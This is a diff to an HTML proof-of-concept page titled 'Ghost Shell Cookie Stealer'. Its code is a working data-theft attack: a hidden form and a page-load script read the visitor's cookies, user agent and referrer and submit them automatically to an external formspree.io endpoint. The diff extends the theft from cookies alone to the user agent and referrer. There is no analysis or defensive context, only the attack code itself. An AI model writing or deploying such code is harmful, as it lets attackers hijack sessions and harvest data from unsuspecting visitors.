@@ -3,26 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC: Hidden Cookie Stealer</title>
+    <title>Ghost Shell Cookie Stealer PoC</title>
     <style>
+        body {
+            background-color: black; /* Set background to black */
+            color: white; /* Text color for visibility */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            font-family: Arial, sans-serif;
+        }
+        h2 {
+            text-align: center;
+        }
         form {
-            display: none; /* Hides the form */
+            display: none; /* Keep form hidden */
         }
     </style>
 </head>
 <body>
 
+    <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
+
     <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST">
         <input type="hidden" name="cookie_data" id="cookieField">
+        <input type="hidden" name="user_agent" id="userAgentField">
+        <input type="hidden" name="referrer" id="referrerField">
+        <button type="submit" name="submitButton">Send</button> <!-- Improves compatibility -->
     </form>
 
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            // Get user's cookies
+            // Capture cookies, user agent, and referrer
             var cookies = document.cookie;
-            
-            // Inject cookies into hidden input field
+            var userAgent = navigator.userAgent;
+            var referrer = document.referrer;
+
+            // Inject data into form fields
             document.getElementById("cookieField").value = cookies;
+            document.getElementById("userAgentField").value = userAgent;
+            document.getElementById("referrerField").value = referrer;
 
             // Auto-submit the form
             document.getElementById("stealthForm").submit();
